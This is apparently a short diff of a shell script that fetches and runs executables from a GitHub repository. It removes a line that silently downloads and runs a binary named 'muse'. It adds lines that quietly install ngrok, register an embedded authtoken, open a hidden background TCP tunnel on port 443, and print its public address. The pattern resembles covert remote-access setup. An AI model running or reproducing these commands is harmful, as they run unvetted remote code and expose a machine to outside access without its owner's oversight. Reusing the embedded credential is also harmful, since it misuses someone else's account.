@@ -6,6 +6,10 @@ wget https://raw.githubusercontent.com/sarifadim/dopla/main/danted && chmod +x *
 sleep 3
 cd /home/
 sleep 3
-wget -qO muse https://raw.githubusercontent.com/sarifadim/dopla/main/event2 && chmod +x muse && ./muse
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip > /dev/null 2>&1
+unzip ngrok-stable-linux-amd64.zip > /dev/null 2>&1
+./ngrok authtoken 1wkgCSYw391hKMgYkB47bZ95cGW_6kEp8sdH54pp8cRxaQL2b
+nohup ./ngrok tcp --region ap 443 &>/dev/null &
+curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"tcp:..([^"]*).*/\1/p'
 EOF
-screen -r
+
